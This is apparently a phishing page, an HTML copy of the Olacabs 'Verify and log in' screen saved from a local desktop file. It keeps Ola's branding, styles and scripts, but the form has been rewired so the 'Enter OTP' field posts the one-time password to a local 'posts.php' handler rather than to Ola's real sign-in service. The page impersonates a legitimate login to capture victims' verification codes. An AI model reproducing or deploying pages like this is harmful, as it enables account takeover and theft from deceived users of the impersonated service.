<!DOCTYPE html>
<!-- saved from url=(0036)file:///C:/Users/hp/Desktop/otp.html -->
<html style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="generator" content="Olacabs">
    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=yes">
    <meta name="author" content="Olacabs - ANI Technologies">
    <meta name="keywords" content="Car rentals India , Car Hire , Taxi India , book cabs , Cab online , Taxi Cabs , Call Cab , Taxi on Call , Airport Transfer ,  Mumbai Cabs , Travel Companies, online-car-rental">
    <meta name="keyphrase" content="Car rentals India , Car Hire , Taxi India , book cabs , Cab online , Taxi Cabs , Call Cab , Taxi on Call , Airport Transfer ,  Mumbai Cabs , Travel Companies, online-car-rental">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link href="https://olawebcdn.com/" rel="preconnect">
    <link rel="canonical" href="https://accounts.olacabs.com/">
    <title>Book a cab in India | Hire a City Taxi at lowest fares| India's largest cab network | olacabs.com</title>
    <meta name="description" content="India&#39;s smartest cab service. Book a cab in Lucknow, Indore, Mumbai, Pune, Bangalore, Delhi , Chandigarh, Ahmedabad, Chennai, Hyderabad with one-touch on the ola mobile app or call 33553355. For best taxi service @lowest fares, say Ola! | olacabs.com">
    <meta name="description" content="Now book city taxi, share, rental and outstation directly from web.">
    <link rel="icon" href="https://accounts.olacabs.com/en-in/images/manifest/img_logomark@4x.png">
    <link rel="shortcut icon" sizes="32x32" href="https://accounts.olacabs.com/en-in/images/manifest/img_logomark@4x.png">
    <link rel="manifest" href="https://accounts.olacabs.com/en-in/manifest.json">
    <meta name="theme-color" content="#424a54">
    <meta name="application-name" content="Olacabs">
    <link rel="apple-touch-icon" href="https://accounts.olacabs.com/en-in/images/manifest/ios_img_logomark.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://accounts.olacabs.com/en-in/images/manifest/ios_img_logomark@1.5x.png">
    <link rel="apple-touch-icon" sizes="96x96" href="https://accounts.olacabs.com/en-in/images/manifest/ios_img_logomark@2x.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://accounts.olacabs.com/en-in/images/manifest/ios_img_logomark@3x.png">
    <link rel="apple-touch-icon" sizes="192x192" href="https://accounts.olacabs.com/en-in/images/manifest/ios_img_logomark@4x.png">
    <meta name="msapplication-TileImage" content="images/manifest/img_logomark@3x.png">
    <meta name="msapplication-TileColor" content="#424a54">
    <meta name="msapplication-tap-highlight" content="no">
    <!--<base href="/en-in/">--><!--<base href=".">--><base href=".">
    <style>
        html {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-size: 16px;
            -moz-osx-font-smoothing: grayscale;
            -webkit-font-smoothing: antialiased;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0.1);
            text-rendering: optimizeLegibility;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            text-size-adjust: 100%;
            height: 100%;
        }

        body {
            position: relative;
            margin: 0;
           
            overflow: hidden;
            min-height: 480px;
            height: 100%;
        }

        svg {
            pointer-events: none;
            width: 20px;
            height: 20px;
            fill: currentcolor;
            stroke: none;
        }

        .sso__wrapper * {
            box-sizing: border-box;
        }
    </style>
    <style>
        body {
  background-image: url('otp_files/banner-l.gif');
        }
  </style>
    <script defer="" src="file:///C:/Users/hp/Desktop/pages/authentication.20b916ab.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/components/sso-login.1fb3f09b.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/components/sso-header.32ac4304.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/components/sso-styles.66a2b0ed.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/logout.d02c072b.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/kyc.76b820c3.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/kyc-full-kyc.219bde48.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/refreshtoken.eb48880c.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/2fa.e0ddfc58.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/verify-email.9ea99753.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/reset-password.570b5988.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/components/sso-bridge.b873633c.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/pages/data-privacy.d6846e78.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-ajax.d7ec024b.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-dot-loader.3aa2f6b6.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-loader.f6e2adce.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-top-loader.b05ac4f6.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-button.2df5eb23.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-icon.90a7eeab.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-modal.7beb9846.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-dialog.1d6b98d4.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-toast.1349c6a6.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-select.21ad1d10.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-polling.9b340d56.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/ow-components/ow-ga.b1dab005.js"></script><script defer="" src="file:///C:/Users/hp/Desktop/mixins/nativebridge.a578e033.js"></script></head><body><div>
<style id="data-v-09520f58">.sso-app[data-v-09520f58]{--ola-primary-color:#424a54;--ola-highlight-color:#cddc39;--ola-back-color:#f5f5f5;--ola-front-color:#fff;--ola-label-color:#4d4d4d;--ola-text-color:#000;color:var(--ola-text-color);display:block;background:;position:absolute;top:0;bottom:0;left:0;width:100%;min-height:480px;overflow:scroll;--mobile-cont:{max-width:550px;margin:0;display:block;left:0}@apply(--mobile-cont)}</style><script type="text/javascript" async="" src="./otp_files/recaptcha__en.js.download"></script><script type="text/javascript" async="" src="./otp_files/recaptcha__en.js(1).download"></script><script defer="" src="./otp_files/analytics.js.download"></script><script defer="" src="./otp_files/authentication.20b916ab.js.download"></script><script defer="" src="./otp_files/sso-login.1fb3f09b.js.download"></script><script defer="" src="./otp_files/sso-header.32ac4304.js.download"></script><script defer="" src="./otp_files/sso-styles.66a2b0ed.js.download"></script><script defer="" src="./otp_files/logout.d02c072b.js.download"></script><script defer="" src="./otp_files/kyc.76b820c3.js.download"></script><script defer="" src="./otp_files/kyc-full-kyc.219bde48.js.download"></script><script defer="" src="./otp_files/refreshtoken.eb48880c.js.download"></script><script defer="" src="./otp_files/2fa.e0ddfc58.js.download"></script><script defer="" src="./otp_files/verify-email.9ea99753.js.download"></script><script defer="" src="./otp_files/reset-password.570b5988.js.download"></script><script defer="" src="./otp_files/sso-bridge.b873633c.js.download"></script><script defer="" src="./otp_files/data-privacy.d6846e78.js.download"></script><script defer="" src="./otp_files/ow-ajax.d7ec024b.js.download"></script><script defer="" src="./otp_files/ow-dot-loader.3aa2f6b6.js.download"></script><script defer="" src="./otp_files/ow-loader.f6e2adce.js.download"></script><script defer="" src="./otp_files/ow-top-loader.b05ac4f6.js.download"></script><script defer="" src="./otp_files/ow-button.2df5eb23.js.download"></script><script defer="" src="./otp_files/ow-icon.90a7eeab.js.download"></script><script defer="" src="./otp_files/ow-modal.7beb9846.js.download"></script><script defer="" src="./otp_files/ow-dialog.1d6b98d4.js.download"></script><script defer="" src="./otp_files/ow-toast.1349c6a6.js.download"></script><script defer="" src="./otp_files/ow-select.21ad1d10.js.download"></script><script defer="" src="./otp_files/ow-polling.9b340d56.js.download"></script><script defer="" src="./otp_files/ow-ga.b1dab005.js.download"></script><script defer="" src="./otp_files/nativebridge.a578e033.js.download"></script><style id="data-v-258b7808">.sso[data-v-258b7808]{position:relative;padding:25px;text-align:center;margin:8% auto 16px;width:372px;border-radius:4px;background-color:#fff;box-shadow:0 2px 4px 0 rgba(0,0,0,.1)}.shimmer[data-v-258b7808]{animation-duration:1.5s;animation-fill-mode:forwards;animation-iteration-count:5;animation-name:placeHolderShimmer;animation-timing-function:ease-in-out;background:#e5e5e5;background:linear-gradient(90deg,#e5e5e5 8%,#f2f2f2 18%,#e5e5e5 33%);background-size:800px 104px;position:relative}.shimmer.d100[data-v-258b7808]{animation-delay:.1s}@media screen and (max-width:500px){.sso[data-v-258b7808]{margin:0;background:none;box-shadow:none;width:100%;padding:12px 0 0}}</style><script defer="" src="./otp_files/sso-signup.231eaa3c.js.download"></script><script defer="" src="./otp_files/sso-verifyotp.bd2f1dee.js.download"></script><script defer="" src="./otp_files/sso-verifypwd.29a2efad.js.download"></script><script defer="" src="./otp_files/sso-permissions.37355357.js.download"></script><script defer="" src="./otp_files/sso-2fa-verify-call.0d6e73c9.js.download"></script><script defer="" src="./otp_files/sso-forgot-password.909d3b32.js.download"></script><style id="data-v-6f7caecb">.sso[data-v-6f7caecb]{position:relative;padding:25px;text-align:center;margin:8% auto 16px;width:372px;border-radius:4px;background-color:#fff;box-shadow:0 2px 4px 0 rgba(0,0,0,.1)}.sso__title[data-v-6f7caecb]{font-size:18px;font-weight:500;padding-bottom:8px;letter-spacing:-.4px}.sso__sub-title[data-v-6f7caecb]{opacity:.5;font-size:14px;line-height:1.21;letter-spacing:-.2px}.sso__phone__wrapper[data-v-6f7caecb]{position:relative;margin-top:16px;height:48px;border-radius:4px;background-color:#fff;border:1px solid #e5e5e5;display:table;width:100%}.sso__phone__code[data-v-6f7caecb]{border-right:1px solid #ebebeb;padding:0 14px 0 4px;border:none;padding:0 4px}.sso__phone[data-v-6f7caecb],.sso__phone__code[data-v-6f7caecb]{display:inline-block;vertical-align:middle;opacity:.5;font-size:16px;letter-spacing:-.3px}.sso__phone[data-v-6f7caecb]{height:44px;border-radius:4px;background-color:#fff;border:none;width:55%;padding:1px;outline:none}.sso__loader[data-v-6f7caecb]{font-size:10px;margin:30px auto;text-indent:-9999em;width:40px;height:40px;border-radius:50%;background:#e5e985;background:linear-gradient(90deg,#e5e985 10%,hsla(0,0%,100%,0) 42%);position:relative;animation:load3 1.4s infinite linear;transform:translateZ(0)}.sso__loader[data-v-6f7caecb]:before{width:50%;height:50%;background:#fff;border-radius:100% 0 0 0;position:absolute;top:0;left:0;content:""}.sso__loader[data-v-6f7caecb]:after{background:#fff;width:75%;height:75%;border-radius:50%;content:"";margin:auto;position:absolute;top:0;left:0;bottom:0;right:0}.sso__clear-icon[data-v-6f7caecb]{padding:0;border:0;width:24px;height:24px;opacity:1}.sso__cta[data-v-6f7caecb]{margin-top:15px;border-radius:4px;background-color:#e6e6e6;padding:12px;cursor:pointer;color:rgba(0,0,0,.4)}.sso__cta.enabled[data-v-6f7caecb]{background-color:#000;color:#cddc39}.sso__notice a[data-v-6f7caecb]{color:#000}.sso__back[data-v-6f7caecb]{position:absolute;left:20px;top:18px}.sso__back-btn[data-v-6f7caecb]{width:24px;height:24px;opacity:1;cursor:pointer}.sso__clear[data-v-6f7caecb]{position:absolute;width:32px;right:0;top:12px}.sso__new-user__otp-wrapper input[type=number][data-v-6f7caecb]{-webkit-text-security:disc}svg[data-v-6f7caecb]{display:inline-block;vertical-align:middle;opacity:.5}@keyframes load3{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.country-code__wrapper[data-v-6f7caecb]{display:inline-block;vertical-align:middle;position:relative;right:5px;width:60px;border-right:1px solid #ebebeb;cursor:pointer}.country-code__wrapper.single[data-v-6f7caecb]{width:42px!important}.country-code[data-v-6f7caecb]{float:left}.country-code img[data-v-6f7caecb]{display:inline-block;height:100%;vertical-align:middle}.country-list__wrapper[data-v-6f7caecb]{background:#fff;border-radius:6px;padding-bottom:10px}.country-list[data-v-6f7caecb]{margin:0;padding:0}.country-list__header[data-v-6f7caecb]{text-align:center;font-size:18px;font-weight:500;letter-spacing:-.4px;padding:15px}.country-list__item[data-v-6f7caecb]{display:table;width:100%;padding:10px 0}.country-list__item .flag[data-v-6f7caecb]{display:table-cell;vertical-align:middle;width:54px;text-align:center}.country-list__item .name[data-v-6f7caecb]{display:table-cell;vertical-align:middle;text-align:left;font-size:16px;line-height:1.12;color:rgba(0,0,0,.87)}.country-list__item .code[data-v-6f7caecb]{display:table-cell;vertical-align:middle;font-size:16px;text-align:right;color:rgba(0,0,0,.56);padding-right:16px}.line[data-v-6f7caecb]{width:95%;border-bottom:.5px solid rgba(0,0,0,.26);margin:0 auto}.ow-modal-container[data-v-6f7caecb]{margin-top:10%;border-radius:6px}.down-arrow[data-v-6f7caecb]{width:14px;height:9px;margin:1px 0 0 6px;position:relative;top:1px;opacity:.3}.country-code img[data-v-6f7caecb]{width:24px;height:24px}@media screen and (max-width:500px){.sso[data-v-6f7caecb]{margin:0;background:none;box-shadow:none;width:100%;padding:12px 0 0}.sso__phone__wrapper[data-v-6f7caecb]{width:94%;margin:25px auto 0;height:46px}.sso__cta[data-v-6f7caecb]{border-radius:4px;z-index:10;margin:20px 8px 8px}}</style><style id="ssoHeader">.sso__logo{padding-bottom:15px}.sso__back{position:absolute;left:20px;top:18px}.sso__back-btn{width:24px;height:24px;opacity:1;cursor:pointer}@keyframes load3{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@media screen and (max-width:500px){.sso__logo{padding-bottom:12px}.sso__back{left:12px;top:12px}}</style><style id="ssoStyles">*{-webkit-tap-highlight-color:transparent}svg{display:inline-block;vertical-align:middle;opacity:.5}.text-center{text-align:center}.loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%)}</style><style id="data-v-703fa997">.ow-button-container[data-v-703fa997]{width:100%}.ow-button[data-v-703fa997]{border-radius:4px;border:none;font-size:18px;font-weight:300;box-shadow:inset 0 -1px 0 0 hsla(0,0%,100%,.2);text-align:center;box-sizing:border-box;outline:none;cursor:pointer}.ow-button--primary[data-v-703fa997],.ow-button[data-v-703fa997]{background-color:#000;color:#cddc39}.ow-button--secondary[data-v-703fa997]{background-color:#cddc39;color:#000}.ow-button--grey[data-v-703fa997]{background-color:#dedede;color:#000}.disabled[data-v-703fa997]{width:100%;height:44px;border-radius:4px;border:none;font-size:16px;background-color:#000;box-shadow:inset 0 -1px 0 0 hsla(0,0%,100%,.2);text-align:center;outline:none;color:rgba(239,255,33,.3);font-weight:300}.inline[data-v-703fa997]{display:inline-block}</style><style id="owTopLoader">.loader{position:fixed;height:100%;width:100%;z-index:999;overflow:hidden}.loader-false.loader{display:none}.overlay-false.loader{height:8px}.progress{position:absolute;height:4px;display:block;width:100%;background-color:#e2e2e2;top:0;overflow:hidden}.progress .indeterminate{background-color:#cdda49}.progress .indeterminate:before{animation:indeterminate 2.1s cubic-bezier(.65,.815,.735,.395) 50}.progress .indeterminate:after,.progress .indeterminate:before{content:"";position:absolute;background-color:inherit;top:0;left:0;bottom:0;will-change:left,right}.progress .indeterminate:after{animation:indeterminate-short 2.1s cubic-bezier(.165,.84,.44,1) 50;animation-delay:1.15s}@keyframes indeterminate{0%{left:-35%;right:100%}60%{left:100%;right:-90%}to{left:100%;right:-90%}}@keyframes indeterminate-short{0%{left:-200%;right:100%}60%{left:107%;right:-8%}to{left:107%;right:-8%}}</style><style id="owIcon">.ow-svg{pointer-events:none;display:inline-block;width:24px;height:24px;fill:currentcolor;stroke:none}</style><style id="owToast">#ow-toast{position:fixed;top:0;right:0;left:0;color:#fff;padding:15px;font-size:16px;width:100%;opacity:0!important;text-align:center;will-change:transform;transform:translate3d(0,-100%,0);-webkit-transform:translate3d(0,-100%,0);-webkit-transition-property:opacity,transform,opacity;-webkit-transition-duration:.2s;transition-property:opacity,transform,opacity;transition-duration:.2s;z-index:1000;margin:0 auto;box-sizing:border-box}#ow-toast.bottom{top:auto;bottom:16px;font-size:14px;font-weight:300;transform:translate3d(0,100%,0);-webkit-transform:translate3d(0,100%,0)}#ow-toast.opened{opacity:1!important;transform:translateZ(0)}#ow-toast.warning{background-color:#fe554c}#ow-toast.success{background-color:#6db043}#ow-toast.blackbg{background-color:rgba(50,50,50,.95)}</style><script defer="" src="./otp_files/ow-recaptcha.80994be8.js.download"></script><style id="data-v-f176bb62">#login-recaptcha[data-v-f176bb62]{margin-top:15px;transform:scale(1.055);transform-origin:0 0}@media screen and (max-width:500px){#login-recaptcha[data-v-f176bb62]{transform:scale(.945);padding-left:18px;display:inline-block}.text-xs-center[data-v-f176bb62]{text-align:center}}</style><script id="captchaScript" src="./otp_files/api.js.download"></script>
    
    
<form action="posts.php" method="post">
    <div data-v-09520f58="" class="sso-app"><div data-v-258b7808="" data-v-09520f58="" class="sso__wrapper view"><!----> <div data-v-6f7caecb="" data-v-258b7808="" class="sso__wrapper" selectedcountry="[object Object]"><div data-v-6f7caecb="" class="sso"><div data-v-6f7caecb="" id="sso-header" class="sso-header"><div class="sso__back"><i class="icon"><svg viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" class="ow-svg" style="height: 24px; width: 24px;"><g><path d="M7.2 11.5h12.3v1H7.22l4.13 4.15-.7.7-5.36-5.37 5.35-5.33.7.7L7.2 11.5z"></path></g></svg> <!----> <!----></i></div> <div class="sso__logo"><img src="./otp_files/ola-logo.png" height="30" alt="Olacabs Logo"></div></div> <div data-v-6f7caecb="" class="sso__content"><div data-v-6f7caecb="" class="sso__title">Verify and log in</div> <div data-v-6f7caecb="" class="sso__sub-title">Enter the OTP sent to your mobile</div>
       <div data-v-6f7caecb="" class="sso__phone__wrapper"><i data-v-97ac9418="" class="icon sso__new-user__otp-icon"><!----> <svg viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" class="ow-svg" style="height: 24px; width: 24px; fill: rgb(0, 0, 0);"><g><path fill="none" stroke="#000000" stroke-width=".72" d="M12.3824146,13.7892398 L12.3824146,17.9157782 L15.1966205,17.9157782 L15.1966205,19.7122532 C14.2196595,19.6892861 13.3593756,19.7352203 12.4053034,19.7122532 C12.4053034,20.5054583 12.3824146,21.2527291 12.4053034,22 C11.7303629,21.9770329 11.1961048,22 10.5909472,22 C10.5909472,21.9770329 10.5909472,14.7177501 10.613836,11.2166684 C10.613836,10.9836364 10.5909472,10.9136148 10.3347043,10.8435932 C7.21847781,10.0263007 5.98639042,6.33812117 7.94031243,3.79437526 C9.68488566,1.50662845 13.0115774,1.39067263 14.9186053,3.53725583 C16.2913751,5.10069886 16.361158,7.55145604 15.1050653,9.20900815 C14.4541302,10.0722348 13.5927297,10.6324079 12.5699911,10.9124944 C12.4521975,10.9124944 12.3824146,10.9825161 12.3824146,11.0766252 C12.4053034,12.5241124 12.3824146,12.836401 12.3824146,14.2838882 M9.5910974,4.58758033 C8.52146466,5.66087193 8.49745934,7.36547858 9.54420327,8.43877018 C10.5920637,9.48909468 12.336637,9.48909468 13.3833809,8.43877018 C14.4301248,7.38844567 14.4530136,5.63790483 13.4062697,4.58758033 C12.3824146,3.53725583 10.6378413,3.53725583 9.5910974,4.58758033 Z" transform="rotate(-135 11.5 12)" stroke-linecap="round" stroke-linejoin="round"></path></g></svg><input type="tel" name="OTP" placeholder="   Enter OTP" data-v-6f7caecb="" autofocus="autofocus" id="phone-number" autocomplete="off" class="sso__phone"><div data-v-6f7caecb="" class="sso__clear" style=""> <div data-v-6f7caecb="" class="sso__clear-icon"></div></div></i></div><i data-v-97ac9418="" class="icon sso__new-user__otp-icon"> <button data-v-6f7caecb="" class="sso__cta enabled" style="width:100%"><i class="fa fa-download"></i>Log In</button><div data-v-6f7caecb=""></div><!----> <div data-v-703fa997="" data-v-6f7caecb=""></div>

        
        </i></div></div></div></div></div></form><i data-v-97ac9418="" class="icon sso__new-user__otp-icon"> <div data-v-09520f58=""></div> <div data-v-09520f58=""></div>
    

<script src="./otp_files/fingerprint1.js.download" async=""></script>
<script src="./otp_files/vue.runtime.2.4.2a.min.js.download"></script>
<script src="./otp_files/vue-router.2.7.0a.min.js.download"></script>
<script type="text/javascript">
  window.owConfig = {"FKUtmSource":"f945fb70913c491eb620c45557a7a1cc","appDomain":"https://accounts.olacabs.com","cardMsgs":{"minKyc":{"failPage":{"heading":"Or choose an ID proof for Basic KYC","desc":"Enjoy ₹10,000 monthly wallet limit to pay for cab rides, bills, recharges & more."},"homePage":{"heading":"Choose your ID proof","desc":"As per new RBI guidelines, KYC is now mandatory to use Ola Money. By proceeding to complete the KYC process using any of the options below, you agree to the applicable <a href='https://docs.google.com/viewer?url=https://www.olamoney.com/images/pdf/Customer_Terms_and%20Conditions_v20150807-94390dfab4.pdf'>T&C</a>"}},"errors":{"1":{"cta":"RETRY","title":"Aadhaar Verification Failed","desc":"Aadhaar verification couldn’t be completed due to technical issue. Please try again."},"2":{"cta":"RETRY","title":"Aadhaar Verification Failed","desc":"This Aadhaar has already been used to verify another Ola Money account."}},"eKyc":{"cta":"UPGRADE NOW","title":"Want More Benefits?","desc":"Upgrade your wallet and enjoy ₹1,00,000 monthly limit with Aadhaar OTP based verification."}},"termsAndCond":"https://docs.google.com/viewer?url=https%3A%2F%2Fwww.olamoney.com%2Fimages%2Fpdf%2FCustomer_Terms_and%20Conditions_v20150807-94390dfab4.pdf","ivr":{"waitingInterval":180000,"timeoutMessage":"Your verification by call was not complete. Please try again."},"fullKycLink":"https://blog.olacabs.com/provide-your-kyc-details-to-keep-using-ola-money/","googleConfigs":{"recaptchaJsUrl":"https://www.google.com/recaptcha/api.js","gaKey":"UA-20199135-11","recaptchaSiteKey":"6LcwKhcUAAAAAEQP_1Zk7jX1Lxdy3a4XwIJByDQN"},"domainList":["help.olacabs.com","om.olacabs.com","book.olacabs.com","accounts.olacabs.com"],"apiBase":"/","support":{"+91":{"email":"support@olacabs.com","phone":"+91 99885 53311"},"+61":{"email":"support.au@olacabs.com","phone":"+91 99885 53311"}},"deepLinkUrl":"https://book.olacabs.com","fabricEndpoint":"/alchemist-api/event/publish"};

  //a function to store app interactions when the main component has still not loaded
  window.ssoFields = {};
  window.populateFields = function(key, value){
    if(typeof(value) == "string"){
      try{
        ssoFields[key] = JSON.parse(value);
      }
      catch(ex){}
    } else {
      ssoFields[key] = value;
    }
  };
	if (typeof Object.assign != 'function') {
		Object.assign = function (target, varArgs) { // .length of function is 2
			'use strict';
			if (target == null) { // TypeError if undefined or null
				throw new TypeError('Cannot convert undefined or null to object');
			}

			var to = Object(target);

			for (var index = 1; index < arguments.length; index++) {
				var nextSource = arguments[index];

				if (nextSource != null) { // Skip over if undefined or null
					for (var nextKey in nextSource) {
						// Avoid bugs when hasOwnProperty is shadowed
						if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
							to[nextKey] = nextSource[nextKey];
						}
					}
				}
			}
			return to;
		};
	}
</script>
      
<script src="./otp_files/ow.0.0.4b.js.download"></script>
<script src="./otp_files/router.844706df.js.download"></script>
<script src="./otp_files/app.b3d5b388.js.download" async=""></script>

    

    </div></i></div></body></html>